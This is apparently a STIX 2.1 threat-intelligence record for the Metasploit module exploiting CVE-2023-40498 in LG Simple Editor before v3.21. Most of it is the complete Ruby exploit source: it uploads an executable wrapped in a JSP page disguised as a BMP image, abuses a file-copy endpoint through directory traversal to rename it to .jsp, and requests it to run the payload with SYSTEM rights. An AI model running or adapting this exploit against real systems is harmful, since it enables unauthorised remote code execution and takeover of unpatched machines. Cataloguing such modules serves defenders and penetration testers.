{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d376f8c-4d08-419b-a687-fd45742d78de",
    "created": "2024-08-14T16:52:31.336618Z",
    "modified": "2024-08-14T16:52:31.336621Z",
    "name": "LG Simple Editor Remote Code Execution",
    "description": " This Metasploit module exploits broken access control and directory traversal vulnerabilities in LG Simple Editor software for gaining code execution. The vulnerabilities exist in versions of LG Simple Editor prior to v3.21. By exploiting this flaw, an attacker can upload and execute a malicious JSP payload with the SYSTEM user permissions.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/lg_simple_editor_rce.rb",
            "external_id": "lg_simple_editor_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-40498"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper # includes register_files_for_cleanup\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LG Simple Editor Remote Code Execution',\n        'Description' => %q{\n          This Metasploit module exploits broken access control and directory traversal\n          vulnerabilities in LG Simple Editor software for gaining code execution.\n          The vulnerabilities exist in versions of LG Simple Editor prior to v3.21.\n          By exploiting this flaw, an attacker can upload and execute a malicious JSP\n          payload with the SYSTEM user permissions.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rgod', # Vulnerability discovery\n          'Ege Balc\u0131 <egebalci@pm.me>' # msf module\n        ],\n        'References' => [\n          ['ZDI', '23-1204'],\n          ['CVE', '2023-40498']\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 5\n        },\n        'Platform' => %w[win],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          ['LG Simple Editor <= v3.21', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-08-24',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The URI of the LG Simple Editor', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'simpleeditor', 'common', 'commonReleaseNotes.do')\n      }\n    )\n\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n\n    version = Rex::Version.new(res.get_html_document.xpath('//h2')[0]&.text&.gsub('v', ''))\n    return Exploit::CheckCode::Unknown if version.nil? || version == 'Unknown'\n    return Exploit::CheckCode::Appears(\"Version: #{version}\") if version <= Rex::Version.new('3.21.0')\n\n    Exploit::CheckCode::Safe\n  end\n\n  def generate_jsp_payload\n    exe = generate_payload_exe\n    base64_exe = Rex::Text.encode_base64(exe)\n    payload_name = rand_text_alpha(rand(3..8))\n\n    var_raw = 'a' + rand_text_alpha(rand(3..10))\n    var_ostream = 'b' + rand_text_alpha(rand(3..10))\n    var_buf = 'c' + rand_text_alpha(rand(3..10))\n    var_decoder = 'd' + rand_text_alpha(rand(3..10))\n    var_tmp = 'e' + rand_text_alpha(rand(3..10))\n    var_path = 'f' + rand_text_alpha(rand(3..10))\n    var_proc2 = 'e' + rand_text_alpha(rand(3..10))\n\n    jsp = %|\n    <%@page import=\"java.io.*\" %>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{payload_name}\", \".exe\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp.gsub!(/[\\n\\t\\r]/, '')\n\n    jsp\n  end\n\n  def copy_file(src, dst)\n    data = {\n      command: 'cp',\n      option: '-f',\n      srcPath: src,\n      destPath: dst\n    }\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'simpleeditor', 'fileSystem',\n                               'makeDetailContent.do'),\n        'headers' => {\n          'X-Requested-With' => 'XMLHttpRequest',\n          'Accept' => 'application/json'\n        },\n        'ctype' => 'application/json',\n        'data' => data.to_json\n      }\n    )\n    if res && res.code == 200 && res.body.to_s.include?('errorMessage\":\"success\",')\n      print_good \"#{src} -> #{dst} copy successfull.\"\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not copy the payload.\")\n    end\n  end\n\n  def exploit\n    rand_name = Rex::Text.rand_text_alpha(5)\n    form = Rex::MIME::Message.new\n    form.add_part(\n      generate_jsp_payload,\n      'image/bmp',\n      'binary',\n      \"form-data; name=\\\"uploadFile\\\"; filename=\\\"#{rand_name}.bmp\\\"\"\n    )\n    form.add_part('/', nil, nil, 'form-data; name=\"uploadPath\"')\n    form.add_part('-1000', nil, nil, 'form-data; name=\"uploadFile_x\"')\n    form.add_part('-1000', nil, nil, 'form-data; name=\"uploadFile_y\"')\n    form.add_part('1920', nil, nil, 'form-data; name=\"uploadFile_width\"')\n    form.add_part('1080', nil, nil, 'form-data; name=\"uploadFile_height\"')\n\n    print_status 'Uploading JSP payload...'\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'simpleeditor', 'imageManager', 'uploadImage.do'),\n        'ctype' => \"multipart/form-data; boundary=#{form.bound}\",\n        'data' => form.to_s\n      }\n    )\n    if res && res.code == 200\n      print_good 'Payload uploaded successfully'\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Payload upload failed\")\n    end\n\n    # Now we copy our payload as JSP\n    copy_file(\"/#{rand_name}_original.bmp\", \"/#{rand_name}.jsp\")\n    register_files_for_cleanup(\"./webapps/simpleeditor/#{rand_name}.jsp\")\n\n    print_status 'Triggering payload...'\n    send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'simpleeditor', \"#{rand_name}.jsp\")\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-08-24",
    "x_mitre_platforms": [
        "%w[win]"
    ]
}